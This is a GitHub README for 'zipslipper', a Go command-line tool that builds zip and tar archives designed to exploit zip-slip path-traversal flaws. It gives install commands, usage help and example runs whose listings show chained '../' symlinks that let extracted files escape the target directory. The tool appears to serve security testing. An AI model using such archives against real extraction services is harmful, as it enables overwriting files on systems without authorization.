<a href="https://github.com/NodyHub/zipslipper/actions/workflows/golangci-lint.yml"><img src="https://github.com/NodyHub/zipslipper/actions/workflows/golangci-lint.yml/badge.svg" align="right" alt="golangci-lint"></a>
# zipslipper
Create tar/zip archives that try to exploit zipslip vulnerability.

## CLI Tool

You can use this library on the command line with the `zipslipper` command.

### Installation

```cli
go install github.com/NodyHub/zipslipper@latest
```

### Manual Build and Installation

```cli
git clone git@github.com:NodyHub/zipslipper.git
cd zipslipper
make
make install
```

## Usage

Basic usage on cli:

```shell
% zipslipper -h
Usage: zipslipper <input> <relative-path> <output-file> [flags]

A utility to build tar/zip archives that performs a zipslip attack.

Arguments:
  <input>            Input file.
  <relative-path>    Relative extraction path.
  <output-file>      Output file.

Flags:
  -h, --help                  Show context-sensitive help.
  -t, --archive-type="zip"    Archive type. (tar, zip)
  -v, --verbose               Verbose logging.
  -V, --version               Print release version information.
```

## Usage example

### Zip

```shell
(main[2]) ~/git/zipslipper% zipslipper go.mod ../../foo/bar/go.mod test.zip
(main[2]) ~/git/zipslipper% unzip -l test.zip
Archive:  test.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  09-20-2024 11:01   sub/
        3  09-20-2024 11:01   sub/root
        3  09-20-2024 11:01   sub/root/outside
        3  09-20-2024 11:01   sub/root/outside/0
        3  09-20-2024 11:01   sub/root/outside/0/1
        0  09-20-2024 11:01   sub/root/outside/0/1/foo/
        0  09-20-2024 11:01   sub/root/outside/0/1/foo/bar/
      103  09-20-2024 08:39   sub/root/outside/0/1/foo/bar/go.mod
---------                     -------
      115                     8 files
```

### Tar

```shell
(main[2]) ~/git/zipslipper% zipslipper -t tar go.mod ../../foo/bar/go.mod test.tar
(main[2]) ~/git/zipslipper% tar ztvf test.tar
drwxr-xr-x  0 0      0           0 20 Sep 11:01 sub/
lrwxr-xr-x  0 0      0           0 20 Sep 11:01 sub/root -> ../
lrwxr-xr-x  0 0      0           0 20 Sep 11:01 sub/root/outside -> ../
lrwxr-xr-x  0 0      0           0 20 Sep 11:01 sub/root/outside/0 -> ../
lrwxr-xr-x  0 0      0           0 20 Sep 11:01 sub/root/outside/0/1 -> ../
drwxr-xr-x  0 0      0           0 20 Sep 11:01 sub/root/outside/0/1/foo/
drwxr-xr-x  0 0      0           0 20 Sep 11:01 sub/root/outside/0/1/foo/bar/
-rw-r--r--  0 jan    staff     103 20 Sep 08:39 sub/root/outside/0/1/foo/bar/go.mod
```
